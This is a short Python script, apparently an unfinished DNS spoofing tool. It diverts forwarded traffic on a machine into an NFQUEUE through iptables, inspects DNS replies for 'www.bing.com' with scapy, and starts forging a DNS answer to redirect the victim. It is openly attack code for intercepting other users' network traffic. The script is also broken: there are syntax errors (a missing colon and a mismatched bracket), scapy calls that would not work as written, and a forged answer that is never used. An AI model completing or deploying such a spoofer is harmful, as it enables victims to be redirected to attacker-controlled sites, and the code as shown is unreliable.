#!/usr/bin/env python
import netfilterqueue
import pyptables
import scapy

def main():
    setup_iptables()

    try:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        #TODO This may cause issues because except code isn't executing properly in my enviornment
        print('Resetting IP tables and exiting...')
        flush_iptables()


def setup_iptables():
    table = pyptables.Table('filter')
    chain = table.chain('FORWARD')
    rule = pyptables.Rule()
    target = pyptables.Target('NFQUEUE')
    target.set_parameter('queue-num', '0')
    rule.target = target
    chain.insert_rule(rule, position=0)


def flush_iptables():
    table = pyptables.Table('filter')
    chain = table.chain('FORWARD')
    chain.flush()


def process_packet(packet):
    #TODO argparse for the website to spoof?
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR)
        qname = scapy_packet[scapy.DNSQR].qname()
        if "www.bing.com" in qname:
            print('[+] Found website DNS request. Spoofing...']
            answer = scapy.DNSRR(rrname=qname)

    packet.accept()


if __name__ == '__main__':
    main()